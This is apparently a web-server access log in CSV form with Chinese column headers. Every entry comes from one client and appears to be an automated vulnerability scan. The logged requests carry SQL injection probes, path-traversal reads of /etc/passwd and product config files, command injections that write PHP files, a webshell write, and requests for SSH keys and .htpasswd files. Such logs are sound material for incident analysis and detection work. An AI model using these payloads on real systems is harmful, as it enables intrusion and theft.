date(日期),time(时间),s-ip(服务器 IP 地址),cs-method(请求方法),cs-uri-stem(URI 资源 ),cs-uri-query(URI 查询),s-port(服务器端口),c-ip(客户端 IP 地址),cs(User-Agent)(浏览器类型),sc-status(状态码)
2023-02-17,05:37:45,10.115.98.108,GET,/index.php,"s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(201783772),0x7e),1)",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/database.yml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/seeyon/webmail.do,method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dama.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CHANGELOG.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/eam/vib,id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/plugin.php,id=wechat:wechat&ac=wxregister,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/user.php,act=collection_list,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/composer.lock,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CHANGELOG,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/weaver/org.springframework.web.servlet.ResourceServlet,resource=/WEB-INF/web.xml,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/member/ajax_membergroup.php,action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(857891057)+--+@`'`,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/jmx-console/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/uabgdcpflv,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/viewthread.php,tid=10,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/eam/vib,id=/etc/passwd,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/sftp-config.json,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dama.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/changelog.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/jkstatus;,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dama.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/fsnxontyxr,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/v2/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/data.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/changelog.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/yyoa/DownExcelBeanServlet,contenttype=username&contentvalue=&state=1&per_id=0,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/labfgtushz,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dama.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/forum.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin/,a=Factory();print(941628516%2b980006193);//../,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dama.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/debug,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/index.php,m=vod-search&wd={if-A:printf(md5(824336518))}{endif-A},881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/secure/ViewUserHover.jspa,username=hgnbypav,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/wp-admin/admin.php,page=download_report&report=users&status=all,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/forum.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/database.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/sgzdrauqxy,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/changelog,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CONTRIBUTING.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/systemController/showOrDownByurl.do,down=&dbPath=../../../../../../etc/passwd,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/manager/index.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,"/member/cart/Fastpay&shopid=-1%20union%20select%20md5(2036740625),2,3,4%20--+",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin/sql,query=SELECT%20md5(200688110),881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/include/downmix.inc.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/resin-doc/viewfile/,file=index.jsp,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/systemController/showOrDownByurl.do,down=&dbPath=../../../../../Windows/win.ini,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CONTRIBUTING.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/f/job.php,"job=getzone&typeid=zone&fup=..\..\do\js&id=514125&webdb[web_open]=1&webdb[cache_time_js]=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,md5(209943022),9,10,11,12,13,14,15,16,17,18,19%23",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/db.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.html,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/tglgdpuixw,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/weaver/ln.FileDownload,fpath=../ecology/WEB-INF/web.xml,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin.html,s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CONTRIBUTING,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/core,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/objects/getImageMP4.php,base64Url=YGVjaG8gampsd2hhdmUgPiBsZW5kLnR4dGA%3D&format=jpg,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/863111929.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/app/kibana,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/objects/lend.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/get_luser_by_sshport.php,"clientip=1;echo%20""<?php%20echo%20md5(abpmbabwgf);unlink(__FILE__);?>"">/opt/freesvr/web/htdocs/freesvr/audit/abpmbabwgf.php;&clientport=1",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/remote/fgt_lang,lang=/../../../..//////////dev/cmdb/sslvpn_websession,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/abpmbabwgf.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/backup.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/dump.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/test.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/index.php,"option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(8888)),1)",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/create.sql,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/public/index.php,s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install.php.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/info,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/authenticationserverservlet,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/public/index.php,s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/login.html,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/ueditor/net/controller.ashx,action=catchimage&encode=utf-8,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/_config,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/script,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install.php.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/htmltopdf/downfile.php,filename=/windows/win.ini,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/23669352.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/igdldxgfav,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upload.do,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/run,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/install.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/duomiphp/ajax.php,"action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(2000000005)))",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/api/whoami,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/guest_auth/otvv.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/h2-console,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upfile.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/.git/config,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/fgzgdgdbcz,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/INSTALL.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/pma/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/index.php,"a=fetch&content=%3C?php+file_put_contents(%2219526.php%22,%22%3C?php+echo+1288619163%3B%22)%3B",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/.htpasswd,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upfile.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/19526.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/plus/carbuyaction.php,dopost=return&code=../../,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/include/makecvs.php,"Event=http|echo%20""<?php%20echo%20md5(wlsmvfbbmc);unlink(__FILE__);?>""%20>>%20/usr/www/wlsmvfbbmc.php%20&&%20chmod%20755%20/usr/www/wlsmvfbbmc.php||",881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/.htpasswd.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/INSTALL.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upfile.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/yzchsrkccp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/web.config.i18n.ashx,l=en-US&v=859041270,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/htpasswd.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/INSTALL,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/plus/carbuyaction.php,dopost=return&code=../../,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/upfile.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/zgnwnzcmpl,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/ping,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/MAINTAINERS.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/admin-console/index.seam,actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b8097415*9407405%7d,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/.ssh/id_rsa.pub,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
